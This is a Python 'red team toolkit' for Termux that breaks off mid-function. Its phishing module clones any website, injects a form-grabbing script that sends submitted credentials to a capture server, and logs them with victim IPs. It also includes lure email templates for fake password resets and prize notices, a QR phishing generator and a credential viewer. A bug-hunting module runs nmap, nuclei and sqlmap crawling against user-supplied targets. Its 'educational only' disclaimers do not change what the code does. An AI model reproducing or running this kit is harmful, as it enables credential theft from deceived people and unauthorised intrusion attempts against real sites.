#!/usr/bin/env python3
"""
Red Team Specialized Toolkit - TERMUX VERSION
Phishing | Bug Hunting | Red Team Attacks
For Educational and Authorized Testing Only

WARNING: This tool is for AUTHORIZED TESTING ONLY.
Use only on systems you own or have explicit permission to test.
Unauthorized access to computer systems is illegal.

Author: Cybersecurity Education Program
Version: 2.0 - Termux Edition
"""

import os
import sys
import subprocess
import json
import urllib.request
import urllib.parse
import ssl
import socket
import re
import threading
import time
from datetime import datetime
from pathlib import Path
from http.server import HTTPServer, SimpleHTTPRequestHandler
import shutil

# Detect if running on Termux
IS_TERMUX = os.path.exists('/data/data/com.termux') or 'com.termux' in os.environ.get('PREFIX', '')

# Color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Global configuration
PHISHING_DIR = Path.home() / "phishing_campaigns"
REPORTS_DIR = Path.home() / "bug_hunting_reports"
WORDLISTS_DIR = Path.home() / "wordlists"

def print_banner():
    """Display the tool banner"""
    banner = f"""
{Colors.FAIL}{'='*75}
    ____           __  ______                      ______            __ __   _ __ 
   / __ \\___  ____/ / /_  __/__  ____ _____ ___  /_  __/___  ____  / // /__(_) /_
  / /_/ / _ \\/ __  /   / / / _ \\/ __ `/ __ `__ \\  / / / __ \\/ __ \\/ // //_/ / __/
 / _, _/  __/ /_/ /   / / /  __/ /_/ / / / / / / / / / /_/ / /_/ / // ,< / / /_  
/_/ |_|\\___/\\__,_/   /_/  \\___/\\__,_/_/ /_/ /_/ /_/  \\____/\\____/_//_/|_/_/\\__/  
                                                                                    
         🎯 Phishing | 🐛 Bug Hunting | ⚔️  Red Team Attacks
                    For Educational Use Only v2.0
{'='*75}{Colors.ENDC}
    """
    print(banner)

def print_legal_warning():
    """Display legal disclaimer"""
    warning = f"""
{Colors.FAIL}{'='*75}
                           ⚠️  LEGAL DISCLAIMER ⚠️
{'='*75}

THIS TOOL IS FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY

• Use ONLY on systems you own or have WRITTEN PERMISSION to test
• Unauthorized access to computer systems is ILLEGAL
• Violations may result in CRIMINAL PROSECUTION
• You accept FULL RESPONSIBILITY for your actions

By using this tool, you agree:
1. You have explicit authorization for all testing
2. You understand the legal implications
3. You will use this for educational purposes only
4. You will not use this for malicious purposes

{'='*75}{Colors.ENDC}
"""
    print(warning)
    response = input(f"\n{Colors.WARNING}Type 'I ACCEPT' to continue or anything else to exit: {Colors.ENDC}").strip()
    if response != "I ACCEPT":
        print(f"\n{Colors.FAIL}[!] Legal terms not accepted. Exiting...{Colors.ENDC}")
        sys.exit(0)
    print(f"{Colors.OKGREEN}[✓] Terms accepted. Proceeding...{Colors.ENDC}\n")

def create_directories():
    """Create necessary directories"""
    for directory in [PHISHING_DIR, REPORTS_DIR, WORDLISTS_DIR]:
        directory.mkdir(exist_ok=True)

def check_tool_installed(tool_name):
    """Check if a security tool is installed"""
    try:
        result = subprocess.run(['which', tool_name], capture_output=True, text=True, timeout=5)
        return result.returncode == 0
    except:
        return False

def run_command(command, description="Running command", timeout=300):
    """Execute a shell command and return the output"""
    print(f"\n{Colors.OKBLUE}[*] {description}...{Colors.ENDC}")
    print(f"{Colors.OKCYAN}[CMD] {command}{Colors.ENDC}\n")
    
    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        
        output = result.stdout + result.stderr
        if result.returncode == 0:
            print(f"{Colors.OKGREEN}[✓] Command completed successfully{Colors.ENDC}")
        else:
            print(f"{Colors.WARNING}[!] Command completed with warnings{Colors.ENDC}")
        
        return output
    except subprocess.TimeoutExpired:
        print(f"{Colors.FAIL}[✗] Command timed out{Colors.ENDC}")
        return "Command timed out"
    except Exception as e:
        print(f"{Colors.FAIL}[✗] Error: {e}{Colors.ENDC}")
        return f"Error: {e}"

def download_file(url, destination):
    """Download a file from URL"""
    try:
        print(f"{Colors.OKBLUE}[*] Downloading from {url}...{Colors.ENDC}")
        urllib.request.urlretrieve(url, destination)
        print(f"{Colors.OKGREEN}[✓] Downloaded to {destination}{Colors.ENDC}")
        return True
    except Exception as e:
        print(f"{Colors.FAIL}[✗] Download failed: {e}{Colors.ENDC}")
        return False

# ==================== PHISHING MODULE ====================

def phishing_menu():
    """Phishing module main menu"""
    while True:
        print(f"\n{Colors.HEADER}{'='*75}")
        print("                    🎣 PHISHING MODULE - EDUCATIONAL ONLY")
        print(f"{'='*75}{Colors.ENDC}")
        print(f"""
{Colors.OKBLUE}1.{Colors.ENDC} Clone Website (HTTrack)
{Colors.OKBLUE}2.{Colors.ENDC} Clone Website (wget - Simple)
{Colors.OKBLUE}3.{Colors.ENDC} Setup Phishing Server (with credential capture)
{Colors.OKBLUE}4.{Colors.ENDC} Create Email Templates
{Colors.OKBLUE}5.{Colors.ENDC} QR Code Phishing Generator
{Colors.OKBLUE}6.{Colors.ENDC} Social Engineering Toolkit (SET) Launcher
{Colors.OKBLUE}7.{Colors.ENDC} View Captured Credentials
{Colors.OKBLUE}8.{Colors.ENDC} Manage Phishing Campaigns
{Colors.OKBLUE}0.{Colors.ENDC} Back to Main Menu
        """)
        
        choice = input(f"{Colors.WARNING}Select option: {Colors.ENDC}").strip()
        
        if choice == '1':
            clone_website_httrack()
        elif choice == '2':
            clone_website_wget()
        elif choice == '3':
            setup_phishing_server()
        elif choice == '4':
            create_email_templates()
        elif choice == '5':
            generate_qr_phishing()
        elif choice == '6':
            launch_set()
        elif choice == '7':
            view_captured_credentials()
        elif choice == '8':
            manage_campaigns()
        elif choice == '0':
            break
        else:
            print(f"{Colors.FAIL}[!] Invalid option{Colors.ENDC}")

def clone_website_httrack():
    """Clone a website using HTTrack"""
    print(f"\n{Colors.HEADER}=== Website Cloning with HTTrack ==={Colors.ENDC}")
    
    if not check_tool_installed('httrack'):
        print(f"{Colors.FAIL}[!] HTTrack not installed{Colors.ENDC}")
        install = input("Install now? (y/n): ").strip().lower()
        if install == 'y':
            run_command("sudo apt update && sudo apt install -y httrack", "Installing HTTrack")
        else:
            return
    
    target_url = input(f"\n{Colors.WARNING}Enter target URL (e.g., https://example.com): {Colors.ENDC}").strip()
    
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
    
    # Create campaign directory
    domain_name = urllib.parse.urlparse(target_url).netloc.replace('.', '_')
    campaign_dir = PHISHING_DIR / f"clone_{domain_name}_{int(time.time())}"
    campaign_dir.mkdir(exist_ok=True)
    
    print(f"\n{Colors.OKGREEN}[+] Cloning website to: {campaign_dir}{Colors.ENDC}")
    print(f"{Colors.WARNING}[!] This may take several minutes depending on site size...{Colors.ENDC}")
    
    # HTTrack command with options for effective cloning
    cmd = f"""cd "{campaign_dir}" && httrack "{target_url}" \
        -O . \
        -v \
        --display \
        -s0 \
        -N "%p" \
        --max-rate=1000000 \
        --disable-security-limits \
        -F "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        -%e0"""
    
    output = run_command(cmd, f"Cloning {target_url}", timeout=600)
    
    print(f"\n{Colors.OKGREEN}[✓] Website cloned successfully!{Colors.ENDC}")
    print(f"{Colors.OKBLUE}[*] Location: {campaign_dir}{Colors.ENDC}")
    print(f"{Colors.OKBLUE}[*] Open index.html in browser to view{Colors.ENDC}")
    
    # Inject credential capture
    inject = input(f"\n{Colors.WARNING}Inject credential capture script? (y/n): {Colors.ENDC}").strip().lower()
    if inject == 'y':
        inject_credential_capture(campaign_dir)
    
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

def clone_website_wget():
    """Clone a website using wget (simpler method)"""
    print(f"\n{Colors.HEADER}=== Website Cloning with wget ==={Colors.ENDC}")
    
    target_url = input(f"\n{Colors.WARNING}Enter target URL (e.g., https://example.com): {Colors.ENDC}").strip()
    
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
    
    domain_name = urllib.parse.urlparse(target_url).netloc.replace('.', '_')
    campaign_dir = PHISHING_DIR / f"wget_clone_{domain_name}_{int(time.time())}"
    campaign_dir.mkdir(exist_ok=True)
    
    print(f"\n{Colors.OKGREEN}[+] Cloning website to: {campaign_dir}{Colors.ENDC}")
    
    # wget command for website mirroring
    cmd = f"""wget --mirror \
        --convert-links \
        --adjust-extension \
        --page-requisites \
        --no-parent \
        --random-wait \
        --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        -P "{campaign_dir}" \
        "{target_url}" """
    
    output = run_command(cmd, f"Cloning {target_url}", timeout=600)
    
    print(f"\n{Colors.OKGREEN}[✓] Website cloned successfully!{Colors.ENDC}")
    print(f"{Colors.OKBLUE}[*] Location: {campaign_dir}{Colors.ENDC}")
    
    inject = input(f"\n{Colors.WARNING}Inject credential capture script? (y/n): {Colors.ENDC}").strip().lower()
    if inject == 'y':
        inject_credential_capture(campaign_dir)
    
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

def inject_credential_capture(campaign_dir):
    """Inject credential capture JavaScript into cloned pages"""
    print(f"\n{Colors.OKBLUE}[*] Injecting credential capture scripts...{Colors.ENDC}")
    
    # Create capture script
    capture_script = """
<script>
// Educational Credential Capture Script
(function() {
    // Capture form submissions
    document.addEventListener('submit', function(e) {
        var formData = new FormData(e.target);
        var data = {};
        for (var pair of formData.entries()) {
            data[pair[0]] = pair[1];
        }
        
        // Send to capture endpoint
        fetch('/capture_credentials', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                timestamp: new Date().toISOString(),
                url: window.location.href,
                data: data
            })
        }).catch(function(err) {
            console.log('Capture endpoint not available');
        });
    });
    
    console.log('[PHISHING-DEMO] Credential capture active');
})();
</script>
"""
    
    # Find and inject into HTML files
    html_files = list(campaign_dir.rglob("*.html")) + list(campaign_dir.rglob("*.htm"))
    injected_count = 0
    
    for html_file in html_files:
        try:
            with open(html_file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            # Inject before </body> tag
            if '</body>' in content.lower():
                content = content.replace('</body>', f'{capture_script}</body>', 1)
                with open(html_file, 'w', encoding='utf-8') as f:
                    f.write(content)
                injected_count += 1
        except Exception as e:
            print(f"{Colors.WARNING}[!] Could not inject into {html_file.name}: {e}{Colors.ENDC}")
    
    print(f"{Colors.OKGREEN}[✓] Injected capture script into {injected_count} files{Colors.ENDC}")
    
    # Create capture server script
    create_capture_server(campaign_dir)

def create_capture_server(campaign_dir):
    """Create a Python server script for credential capture"""
    server_script = f'''#!/usr/bin/env python3
"""
Phishing Server with Credential Capture
Educational Use Only
"""

from http.server import HTTPServer, SimpleHTTPRequestHandler
import json
import os
from datetime import datetime
from urllib.parse import parse_qs
import ssl

class PhishingHandler(SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/capture_credentials':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            try:
                credentials = json.loads(post_data.decode('utf-8'))
                
                # Save credentials
                log_file = 'captured_credentials.json'
                
                # Load existing
                if os.path.exists(log_file):
                    with open(log_file, 'r') as f:
                        data = json.load(f)
                else:
                    data = []
                
                # Add new capture
                data.append({{
                    'timestamp': datetime.now().isoformat(),
                    'client_ip': self.client_address[0],
                    'credentials': credentials
                }})
                
                # Save
                with open(log_file, 'w') as f:
                    json.dump(data, f, indent=2)
                
                print(f"\\n[CAPTURED] Credentials from {{self.client_address[0]}}")
                print(json.dumps(credentials, indent=2))
                
            except Exception as e:
                print(f"Error capturing: {{e}}")
            
            # Send response
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'{{"status": "ok"}}')
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        # Custom logging
        print(f"[{{self.client_address[0]}}] {{format % args}}")

def run_server(port=8080, use_ssl=False):
    server_address = ('', port)
    httpd = HTTPServer(server_address, PhishingHandler)
    
    if use_ssl:
        # Generate self-signed certificate
        os.system('openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes -subj "/CN=localhost"')
        httpd.socket = ssl.wrap_socket(httpd.socket, certfile='./server.pem', server_side=True)
        protocol = "HTTPS"
    else:
        protocol = "HTTP"
    
    print(f"\\n{'='*60}")
    print(f"  🎣 PHISHING SERVER ACTIVE - EDUCATIONAL USE ONLY")
    print(f"{'='*60}")
    print(f"  Protocol: {{protocol}}")
    print(f"  Port: {{port}}")
    print(f"  URL: {{protocol.lower()}}://localhost:{{port}}")
    print(f"  Credentials will be saved to: captured_credentials.json")
    print(f"{'='*60}\\n")
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\\n[!] Server stopped")
        httpd.shutdown()

if __name__ == '__main__':
    import sys
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
    use_ssl = '--ssl' in sys.argv
    run_server(port, use_ssl)
'''
    
    server_file = campaign_dir / "phishing_server.py"
    with open(server_file, 'w') as f:
        f.write(server_script)
    
    server_file.chmod(0o755)
    
    print(f"\n{Colors.OKGREEN}[✓] Phishing server script created: {server_file}{Colors.ENDC}")
    print(f"{Colors.OKBLUE}[*] To start server: cd {campaign_dir} && python3 phishing_server.py 8080{Colors.ENDC}")

def setup_phishing_server():
    """Setup and launch phishing server"""
    print(f"\n{Colors.HEADER}=== Setup Phishing Server ==={Colors.ENDC}")
    
    campaigns = list(PHISHING_DIR.glob("*/"))
    
    if not campaigns:
        print(f"{Colors.FAIL}[!] No phishing campaigns found. Clone a website first.{Colors.ENDC}")
        input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")
        return
    
    print(f"\n{Colors.OKBLUE}Available campaigns:{Colors.ENDC}")
    for i, campaign in enumerate(campaigns, 1):
        print(f"{i}. {campaign.name}")
    
    try:
        selection = int(input(f"\n{Colors.WARNING}Select campaign: {Colors.ENDC}")) - 1
        campaign_dir = campaigns[selection]
    except:
        print(f"{Colors.FAIL}[!] Invalid selection{Colors.ENDC}")
        return
    
    port = input(f"{Colors.WARNING}Port (default 8080): {Colors.ENDC}").strip() or "8080"
    use_ssl = input(f"{Colors.WARNING}Use SSL/HTTPS? (y/n): {Colors.ENDC}").strip().lower() == 'y'
    
    server_script = campaign_dir / "phishing_server.py"
    
    if not server_script.exists():
        create_capture_server(campaign_dir)
    
    print(f"\n{Colors.OKGREEN}[+] Starting phishing server...{Colors.ENDC}")
    print(f"{Colors.WARNING}[!] Press Ctrl+C to stop the server{Colors.ENDC}")
    print(f"{Colors.OKCYAN}[*] Access at: http{'s' if use_ssl else ''}://localhost:{port}{Colors.ENDC}\n")
    
    ssl_flag = "--ssl" if use_ssl else ""
    os.chdir(campaign_dir)
    os.system(f"python3 phishing_server.py {port} {ssl_flag}")

def create_email_templates():
    """Create phishing email templates"""
    print(f"\n{Colors.HEADER}=== Email Template Generator ==={Colors.ENDC}")
    
    templates = {
        '1': ('Password Reset', '''
Subject: Urgent: Password Reset Required

Dear User,

We have detected unusual activity on your account. For security reasons, 
please reset your password immediately by clicking the link below:

[RESET PASSWORD LINK]

This link will expire in 24 hours.

Best regards,
Security Team
'''),
        '2': ('Account Verification', '''
Subject: Verify Your Account

Hello,

Your account requires verification to continue using our services.
Please verify your account by clicking here:

[VERIFICATION LINK]

Failure to verify within 48 hours will result in account suspension.

Thank you,
Support Team
'''),
        '3': ('Security Alert', '''
Subject: Security Alert - Immediate Action Required

⚠️ SECURITY ALERT ⚠️

We detected a login attempt from an unrecognized device:
- Location: [LOCATION]
- Device: [DEVICE]
- Time: [TIME]

If this wasn't you, secure your account immediately:
[SECURE ACCOUNT LINK]

Security Team
'''),
        '4': ('Prize/Reward', '''
Subject: Congratulations! You've Won

🎉 CONGRATULATIONS! 🎉

You have been selected as a winner in our monthly drawing!

Prize: [PRIZE DESCRIPTION]
Value: [AMOUNT]

Claim your prize here: [CLAIM LINK]

This offer expires in 72 hours.

Winners Department
''')
    }
    
    print(f"\n{Colors.OKBLUE}Available templates:{Colors.ENDC}")
    print("1. Password Reset")
    print("2. Account Verification")
    print("3. Security Alert")
    print("4. Prize/Reward")
    
    choice = input(f"\n{Colors.WARNING}Select template: {Colors.ENDC}").strip()
    
    if choice in templates:
        title, content = templates[choice]
        
        print(f"\n{Colors.OKGREEN}=== {title} Template ==={Colors.ENDC}")
        print(content)
        
        # Customize
        phishing_url = input(f"\n{Colors.WARNING}Enter phishing URL: {Colors.ENDC}").strip()
        
        content = content.replace('[RESET PASSWORD LINK]', phishing_url)
        content = content.replace('[VERIFICATION LINK]', phishing_url)
        content = content.replace('[SECURE ACCOUNT LINK]', phishing_url)
        content = content.replace('[CLAIM LINK]', phishing_url)
        
        # Save template
        template_file = PHISHING_DIR / f"email_template_{choice}_{int(time.time())}.txt"
        with open(template_file, 'w') as f:
            f.write(content)
        
        print(f"\n{Colors.OKGREEN}[✓] Template saved to: {template_file}{Colors.ENDC}")
    
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

def generate_qr_phishing():
    """Generate QR code for phishing"""
    print(f"\n{Colors.HEADER}=== QR Code Phishing Generator ==={Colors.ENDC}")
    
    if not check_tool_installed('qrencode'):
        print(f"{Colors.FAIL}[!] qrencode not installed{Colors.ENDC}")
        install = input("Install now? (y/n): ").strip().lower()
        if install == 'y':
            run_command("sudo apt update && sudo apt install -y qrencode", "Installing qrencode")
        else:
            return
    
    phishing_url = input(f"\n{Colors.WARNING}Enter phishing URL: {Colors.ENDC}").strip()
    label = input(f"{Colors.WARNING}Enter label/description: {Colors.ENDC}").strip() or "Scan Me"
    
    output_file = PHISHING_DIR / f"qr_code_{int(time.time())}.png"
    
    cmd = f'qrencode -o "{output_file}" -s 10 "{phishing_url}"'
    run_command(cmd, "Generating QR code")
    
    print(f"\n{Colors.OKGREEN}[✓] QR code generated: {output_file}{Colors.ENDC}")
    print(f"{Colors.OKBLUE}[*] Use this QR code in physical phishing campaigns{Colors.ENDC}")
    print(f"{Colors.OKBLUE}[*] Label: {label}{Colors.ENDC}")
    
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

def launch_set():
    """Launch Social Engineering Toolkit"""
    print(f"\n{Colors.HEADER}=== Social Engineering Toolkit (SET) ==={Colors.ENDC}")
    
    if not check_tool_installed('setoolkit'):
        print(f"{Colors.FAIL}[!] SET not installed{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[*] Install with: sudo apt install -y set{Colors.ENDC}")
        input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")
        return
    
    print(f"{Colors.WARNING}[!] Launching SET...{Colors.ENDC}")
    os.system("sudo setoolkit")

def view_captured_credentials():
    """View captured credentials from phishing campaigns"""
    print(f"\n{Colors.HEADER}=== Captured Credentials ==={Colors.ENDC}")
    
    cred_files = list(PHISHING_DIR.rglob("captured_credentials.json"))
    
    if not cred_files:
        print(f"{Colors.WARNING}[!] No captured credentials found{Colors.ENDC}")
        input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")
        return
    
    for cred_file in cred_files:
        print(f"\n{Colors.OKBLUE}[+] Campaign: {cred_file.parent.name}{Colors.ENDC}")
        print(f"{Colors.OKCYAN}[*] File: {cred_file}{Colors.ENDC}\n")
        
        try:
            with open(cred_file, 'r') as f:
                data = json.load(f)
            
            for i, entry in enumerate(data, 1):
                print(f"{Colors.OKGREEN}Entry #{i}{Colors.ENDC}")
                print(f"  Timestamp: {entry.get('timestamp', 'N/A')}")
                print(f"  Client IP: {entry.get('client_ip', 'N/A')}")
                print(f"  Credentials: {json.dumps(entry.get('credentials', {}), indent=4)}")
                print()
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error reading file: {e}{Colors.ENDC}")
    
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

def manage_campaigns():
    """Manage phishing campaigns"""
    print(f"\n{Colors.HEADER}=== Manage Campaigns ==={Colors.ENDC}")
    
    campaigns = list(PHISHING_DIR.glob("*/"))
    
    if not campaigns:
        print(f"{Colors.WARNING}[!] No campaigns found{Colors.ENDC}")
        input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")
        return
    
    print(f"\n{Colors.OKBLUE}Campaigns:{Colors.ENDC}")
    for i, campaign in enumerate(campaigns, 1):
        size = sum(f.stat().st_size for f in campaign.rglob('*') if f.is_file())
        print(f"{i}. {campaign.name} ({size / 1024 / 1024:.2f} MB)")
    
    print(f"\n{Colors.OKBLUE}Actions:{Colors.ENDC}")
    print("1. Open campaign folder")
    print("2. Delete campaign")
    print("0. Back")
    
    action = input(f"\n{Colors.WARNING}Select action: {Colors.ENDC}").strip()
    
    if action == '1':
        try:
            idx = int(input(f"{Colors.WARNING}Campaign number: {Colors.ENDC}")) - 1
            os.system(f'xdg-open "{campaigns[idx]}" 2>/dev/null || open "{campaigns[idx]}" 2>/dev/null || explorer "{campaigns[idx]}" 2>/dev/null')
        except:
            print(f"{Colors.FAIL}[!] Invalid selection{Colors.ENDC}")
    
    elif action == '2':
        try:
            idx = int(input(f"{Colors.WARNING}Campaign number to delete: {Colors.ENDC}")) - 1
            confirm = input(f"{Colors.FAIL}Confirm deletion? (yes/no): {Colors.ENDC}").strip().lower()
            if confirm == 'yes':
                shutil.rmtree(campaigns[idx])
                print(f"{Colors.OKGREEN}[✓] Campaign deleted{Colors.ENDC}")
        except:
            print(f"{Colors.FAIL}[!] Operation failed{Colors.ENDC}")
    
    input(f"\n{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

# ==================== BUG HUNTING MODULE ====================

def bug_hunting_menu():
    """Bug hunting module main menu"""
    while True:
        print(f"\n{Colors.HEADER}{'='*75}")
        print("                    🐛 BUG HUNTING MODULE - AUTOMATED")
        print(f"{'='*75}{Colors.ENDC}")
        print(f"""
{Colors.OKBLUE}1.{Colors.ENDC} Full Automated Bug Scan (All-in-One)
{Colors.OKBLUE}2.{Colors.ENDC} Reconnaissance & Subdomain Enumeration
{Colors.OKBLUE}3.{Colors.ENDC} Vulnerability Scanning (Nuclei)
{Colors.OKBLUE}4.{Colors.ENDC} SQL Injection Testing
{Colors.OKBLUE}5.{Colors.ENDC} XSS (Cross-Site Scripting) Testing
{Colors.OKBLUE}6.{Colors.ENDC} Directory Fuzzing & Hidden Files
{Colors.OKBLUE}7.{Colors.ENDC} API Security Testing
{Colors.OKBLUE}8.{Colors.ENDC} CMS Detection & Exploit Search
{Colors.OKBLUE}9.{Colors.ENDC} SSL/TLS Vulnerability Scanning
{Colors.OKBLUE}10.{Colors.ENDC} Parameter Fuzzing (Arjun)
{Colors.OKBLUE}11.{Colors.ENDC} View Bug Hunting Reports
{Colors.OKBLUE}0.{Colors.ENDC} Back to Main Menu
        """)
        
        choice = input(f"{Colors.WARNING}Select option: {Colors.ENDC}").strip()
        
        if choice == '1':
            full_automated_scan()
        elif choice == '2':
            reconnaissance_scan()
        elif choice == '3':
            nuclei_vulnerability_scan()
        elif choice == '4':
            sql_injection_testing()
        elif choice == '5':
            xss_testing()
        elif choice == '6':
            directory_fuzzing()
        elif choice == '7':
            api_security_testing()
        elif choice == '8':
            cms_detection()
        elif choice == '9':
            ssl_tls_scanning()
        elif choice == '10':
            parameter_fuzzing()
        elif choice == '11':
            view_bug_reports()
        elif choice == '0':
            break
        else:
            print(f"{Colors.FAIL}[!] Invalid option{Colors.ENDC}")

def full_automated_scan():
    """Full automated bug hunting scan"""
    print(f"\n{Colors.HEADER}=== FULL AUTOMATED BUG HUNTING SCAN ==={Colors.ENDC}")
    print(f"{Colors.WARNING}[!] This will run all bug hunting modules automatically{Colors.ENDC}")
    
    target = input(f"\n{Colors.WARNING}Enter target URL/domain (e.g., example.com): {Colors.ENDC}").strip()
    
    if not target:
        print(f"{Colors.FAIL}[!] Target required{Colors.ENDC}")
        return
    
    # Normalize target
    target = target.replace('http://', '').replace('https://', '').replace('/', '')
    
    # Create report directory
    report_dir = REPORTS_DIR / f"scan_{target.replace('.', '_')}_{int(time.time())}"
    report_dir.mkdir(exist_ok=True)
    
    print(f"\n{Colors.OKGREEN}[+] Starting comprehensive scan on: {target}{Colors.ENDC}")
    print(f"{Colors.OKBLUE}[*] Report directory: {report_dir}{Colors.ENDC}\n")
    
    results = {
        'target': target,
        'timestamp': datetime.now().isoformat(),
        'findings': []
    }
    
    # Phase 1: Reconnaissance
    print(f"\n{Colors.HEADER}{'='*75}")
    print(f"  PHASE 1: RECONNAISSANCE")
    print(f"{'='*75}{Colors.ENDC}\n")
    
    print(f"{Colors.OKBLUE}[1/9] Subdomain enumeration...{Colors.ENDC}")
    subdomains = run_subdomain_enum(target, report_dir)
    results['findings'].append({'phase': 'reconnaissance', 'subdomains': subdomains})
    
    print(f"\n{Colors.OKBLUE}[2/9] Port scanning...{Colors.ENDC}")
    ports = run_port_scan(target, report_dir)
    results['findings'].append({'phase': 'scanning', 'ports': ports})
    
    # Phase 2: Vulnerability Scanning
    print(f"\n{Colors.HEADER}{'='*75}")
    print(f"  PHASE 2: VULNERABILITY SCANNING")
    print(f"{'='*75}{Colors.ENDC}\n")
    
    print(f"{Colors.OKBLUE}[3/9] Nuclei vulnerability scanning...{Colors.ENDC}")
    run_nuclei_scan(target, report_dir)
    
    print(f"\n{Colors.OKBLUE}[4/9] SQL injection testing...{Colors.ENDC}")
    run_sqlmap(target, report_dir)
    
    print(f"\n{Colors.OKBLUE}[5/9] XSS vulnerability testing...{Colors.ENDC}")
    run_xss_scan(target, report_dir)
    
    # Phase 3: Web Application Testing
    print(f"\n{Colors.HEADER}{'='*75}")
    print(f"  PHASE 3: WEB APPLICATION TESTING")
    print(f"{'='*75}{Colors.ENDC}\n")
    
    print(f"{Colors.OKBLUE}[6/9] Directory and file fuzzing...{Colors.ENDC}")
    run_directory_fuzz(target, report_dir)
    
    print(f"\n{Colors.OKBLUE}[7/9] Technology detection...{Colors.ENDC}")
    run_tech_detection(target, report_dir)
    
    print(f"\n{Colors.OKBLUE}[8/9] SSL/TLS security testing...{Colors.ENDC}")
    run_ssl_scan(target, report_dir)
    
    print(f"\n{Colors.OKBLUE}[9/9] Security headers analysis...{Colors.ENDC}")
    run_security_headers(target, report_dir)
    
    # Save results
    results_file = report_dir / "scan_results.json"
    with open(results_file, 'w') as f:
        json.dump(results, f, indent=2)
    
    # Generate report
    generate_html_report(results, report_dir)
    
    print(f"\n{Colors.OKGREEN}{'='*75}")
    print(f"  ✓ SCAN COMPLETE")
    print(f"{'='*75}{Colors.ENDC}")
    print(f"{Colors.OKBLUE}[*] Results saved to: {report_dir}{Colors.ENDC}")
    print(f"{Colors.OKBLUE}[*] View HTML report: {report_dir / 'report.html'}{Colors.ENDC}\n")
    
    input(f"{Colors.OKCYAN}Press Enter to continue...{Colors.ENDC}")

def run_subdomain_enum(target, report_dir):
    """Run subdomain enumeration"""
    subdomains = []
    
    # Try subfinder
    if check_tool_installed('subfinder'):
        output = run_command(f"subfinder -d {target} -silent", "Subfinder scan", timeout=180)
        subdomains.extend(output.strip().split('\n'))
    
    # Try amass (quick mode)
    if check_tool_installed('amass'):
        output = run_command(f"amass enum -passive -d {target}", "Amass scan", timeout=180)
        subdomains.extend(output.strip().split('\n'))
    
    # Try assetfinder
    if check_tool_installed('assetfinder'):
        output = run_command(f"assetfinder --subs-only {target}", "Assetfinder scan", timeout=60)
        subdomains.extend(output.strip().split('\n'))
    
    # Remove duplicates and empty
    subdomains = list(set([s.strip() for s in subdomains if s.strip() and target in s]))
    
    # Save results
    with open(report_dir / "subdomains.txt", 'w') as f:
        f.write('\n'.join(subdomains))
    
    print(f"{Colors.OKGREEN}[✓] Found {len(subdomains)} subdomains{Colors.ENDC}")
    return subdomains

def run_port_scan(target, report_dir):
    """Run port scanning"""
    if not check_tool_installed('nmap'):
        print(f"{Colors.WARNING}[!] nmap not installed, skipping port scan{Colors.ENDC}")
        return []
    
    output = run_command(f"nmap -T4 -F {target} -oN {report_dir / 'nmap_scan.txt'}", 
                        "Nmap port scan", timeout=300)
    
    # Parse open ports
    ports = re.findall(r'(\d+)/tcp\s+open', output)
    print(f"{Colors.OKGREEN}[✓] Found {len(ports)} open ports{Colors.ENDC}")
    return ports

def run_nuclei_scan(target, report_dir):
    """Run Nuclei vulnerability scanning"""
    if not check_tool_installed('nuclei'):
        print(f"{Colors.WARNING}[!] Nuclei not installed{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[*] Install: GO111MODULE=on go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest{Colors.ENDC}")
        return
    
    # Update templates
    run_command("nuclei -update-templates", "Updating Nuclei templates", timeout=60)
    
    # Run scan
    output_file = report_dir / "nuclei_results.txt"
    cmd = f"nuclei -u https://{target} -severity critical,high,medium -o {output_file}"
    run_command(cmd, "Nuclei vulnerability scan", timeout=600)
    
    if output_file.exists():
        with open(output_file, 'r') as f:
            vulns = len(f.readlines())
        print(f"{Colors.OKGREEN}[✓] Found {vulns} potential vulnerabilities{Colors.ENDC}")

def run_sqlmap(target, report_dir):
    """Run SQLMap for SQL injection testing"""
    if not check_tool_installed('sqlmap'):
        print(f"{Colors.WARNING}[!] SQLMap not installed, skipping{Colors.ENDC}")
        return
    
    # Basic crawl and test
    cmd = f"sqlmap -u 'https://{target}' --batch --crawl=2 --level=1 --risk=1 --output-dir={report_dir / 'sqlmap'}"
    run_command(cmd, "SQL injection testing", timeout=300)

def run_xss_scan(target, report_dir):
    """Run XSS vulnerability testing"""
    if check_tool_installed('dalfox'):
